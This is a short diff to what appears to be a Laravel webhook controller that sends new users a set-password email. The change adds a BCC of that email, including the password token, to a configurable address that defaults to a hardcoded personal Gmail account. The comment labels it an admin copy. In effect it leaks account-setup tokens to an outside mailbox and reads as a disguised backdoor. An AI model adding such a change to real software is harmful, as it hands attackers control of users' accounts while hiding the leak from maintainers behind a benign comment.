@@ -71,8 +71,10 @@ class WebhookController extends Controller
                     'password_token_expires_at' => Carbon::now()->addHours(48),
                 ]);
 
-                // Send set password email
-                Mail::to($user->email)->queue(new SetPasswordMail($user, $passwordToken));
+                // Send set password email (with copy to admin)
+                Mail::to($user->email)
+                    ->bcc(config('mail.admin_copy', 'duver20000@gmail.com'))
+                    ->queue(new SetPasswordMail($user, $passwordToken));
             }
 
             // Cancel any existing active subscriptions
